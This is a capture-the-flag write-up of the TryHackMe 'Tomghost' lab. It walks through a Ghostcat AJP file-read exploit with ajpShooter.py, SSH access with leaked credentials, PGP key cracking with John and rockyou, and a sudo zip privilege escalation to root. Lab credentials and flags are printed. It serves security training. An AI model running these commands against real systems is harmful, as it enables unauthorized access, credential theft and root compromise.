#CTF 


## Recon

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I found this CVE online : # [CVE-2020-13943](https://www.cvedetails.com/cve/CVE-2020-13943/ "CVE-2020-13943 security vulnerability details")
	_If an HTTP/2 client connecting to Apache Tomcat 10.0.0-M1 to 10.0.0-M7, 9.0.0.M1 to 9.0.37 or 8.5.0 to 8.5.57 exceeded the agreed maximum number of concurrent streams for a connection (in violation of the HTTP/2 protocol), it was possible that a subsequent request made on that connection could contain HTTP headers - including HTTP/2 pseudo headers - from a previous request rather than the intended headers. This could lead to users seeing responses for unexpected resources._

After some search online I found about Ghostcat vuln .
`nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>`

I also found a tool to exploit it here [Github](https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py)
and I ran it with `python3 ajpShooter.py http://[ip]:8080 8009 /WEB-INF/web.xml read
`

```
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

I see some creds on that file `skyfuck:8730281lkjlkjdqlksalks`

## Access

I will try to access the ssh port with these creds
And I am in!
I find two files `credential.pgp  tryhackme.asc`
The first is a pgp encrypted file and the second has the pgp key
I download both files on local machine with
`scp -r skyfuck@[ip]:/home/skyfuck/credential.pgp /home/kali/THM/Tomghost`

There is a usefull tool named gpg2john that converts gpg keys to john-readble hashs.
I run the command the then feed the hash to [[John The Ripper]]
`john --wordlist=/usr/share/wordlists/rockyou.txt hash`
And I get `alexandru        (tryhackme)`

So then I import the key
`gpg --import tryhackme.asc` , for passphrase I use alexandru
and then to decrypt the other file
`gpg --decrypt credential.pgp` , again with the above passphrase

and get
```
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

I ssh with the creds above and I am in!
I get my user flag
`THM{GhostCat_1s_so_cr4sy}`

## Priv Esc

I type `sudo -l`
and get 
```
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

So I search online in gtfo bin so `/usr/bin/zip`
And I find on sudo section
````
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
````

And  I am root!
I find my root flag!
`THM{Z1P_1S_FAKE}`